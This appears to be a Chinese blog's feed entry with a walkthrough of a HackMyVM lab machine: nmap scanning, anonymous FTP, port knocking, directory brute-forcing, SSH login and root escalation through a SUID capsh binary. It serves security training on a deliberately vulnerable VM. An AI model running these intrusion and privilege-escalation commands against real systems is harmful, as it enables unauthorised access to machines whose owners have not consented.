    <content type="html"><![CDATA[<h2 id="一、信息收集阶段"><a href="#一、信息收集阶段" class="headerlink" title="一、信息收集阶段"></a>一、信息收集阶段</h2><p>使用 <code>nmap</code> 进行基础服务扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br><span class="line">21/tcp open     ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br></pre></td></tr></table></figure><p>仅 21 端口开放，22 与 80 被防火墙过滤。</p><h2 id="二、FTP-匿名访问"><a href="#二、FTP-匿名访问" class="headerlink" title="二、FTP 匿名访问"></a>二、FTP 匿名访问</h2><p>尝试匿名登录 FTP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br></pre></td></tr></table></figure><p>使用 <code>anonymous</code> 用户成功登录，列出文件后发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.secretnote.txt</span><br></pre></td></tr></table></figure><p>读取该文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secretnote.txt</span><br></pre></td></tr></table></figure><p>输出内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br></pre></td></tr></table></figure><blockquote><p>💡 判断为端口敲门（Port Knocking）机制 —— 按顺序访问指定端口后会触发服务开放。</p></blockquote><hr><h2 id="三、触发端口敲门"><a href="#三、触发端口敲门" class="headerlink" title="三、触发端口敲门"></a>三、触发端口敲门</h2><p>使用 <code>nmap</code> 模拟访问指定端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 1000,2000,3000 192.168.56.101</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="comment">#knock 192.168.56.101 1000 2000 3000</span></span><br></pre></td></tr></table></figure><p>再次扫描开放端口，发现 SSH 与 HTTP 已开放：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br></pre></td></tr></table></figure><p>扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><hr><h2 id="四、Web-信息搜集"><a href="#四、Web-信息搜集" class="headerlink" title="四、Web 信息搜集"></a>四、Web 信息搜集</h2><p>访问首页：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101</span><br></pre></td></tr></table></figure><p>返回内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure><ul><li>可疑用户名：<code>medusa</code></li><li>页面隐藏摩斯密码：<code>--- --- - .... .. -. --.</code> 解码为 “nothing”</li></ul><hr><h2 id="五、目录扫描"><a href="#五、目录扫描" class="headerlink" title="五、目录扫描"></a>五、目录扫描</h2><p>对 Web 服务进行目录爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40</span><br></pre></td></tr></table></figure><p>发现路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">/home</span><br><span class="line">/secret</span><br></pre></td></tr></table></figure><p>但这些目录中的内容多为迷惑信息，无显著突破。</p><hr><h2 id="六、回到-FTP，文件发生变化"><a href="#六、回到-FTP，文件发生变化" class="headerlink" title="六、回到 FTP，文件发生变化"></a>六、回到 FTP，文件发生变化</h2><p>重新连接 FTP，发现 <code>.secretnote.txt</code> 内容发生了变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br><span class="line">Ihavebeenalwayshere!!!</span><br></pre></td></tr></table></figure><p>推测为提示我们已完成敲门，服务全部开放，下一步可登录 SSH。</p><hr><h2 id="七、SSH-登录与提权"><a href="#七、SSH-登录与提权" class="headerlink" title="七、SSH 登录与提权"></a>七、SSH 登录与提权</h2><p>使用用户名 <code>medusa</code> 和密码登录 SSH（密码推测来源于 FTP 或站点信息）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh medusa@192.168.56.101</span><br></pre></td></tr></table></figure><h3 id="7-1-sudo-权限枚举"><a href="#7-1-sudo-权限枚举" class="headerlink" title="7.1 sudo 权限枚举"></a>7.1 sudo 权限枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure><p>发现可执行 <code>/bin/id</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /bin/id</span><br></pre></td></tr></table></figure><p>无明显提权突破，继续寻找 SUID 程序。</p><h3 id="7-2-查找-SUID-程序"><a href="#7-2-查找-SUID-程序" class="headerlink" title="7.2 查找 SUID 程序"></a>7.2 查找 SUID 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现关键提权点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh</span><br></pre></td></tr></table></figure><p>该程序支持通过 <code>--uid=0 --gid=0</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh --gid=0 --uid=0 --</span><br></pre></td></tr></table></figure><p>获取 <code>root</code> shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>成功提权。</p><hr><h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><ul><li>利用了 FTP 匿名访问发现敲门信息</li><li>模拟敲门成功开放被过滤端口</li><li>利用存在的 SUID 程序 capsh 成功提权为 root</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、信息收集阶段&quot;&gt;&lt;a href=&quot;#一、信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;一、信息收集阶段&quot;&gt;&lt;/a&gt;一、信息收集阶段&lt;/h2&gt;&lt;p&gt;使用 &lt;code&gt;nmap&lt;/code&gt; 进行基础服务扫描：&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="靶机" scheme="https://lontan0.github.io/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lontan0.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
    <category term="hackmyvm" scheme="https://lontan0.github.io/tags/hackmyvm/"/>
    
  </entry>
  
</feed>
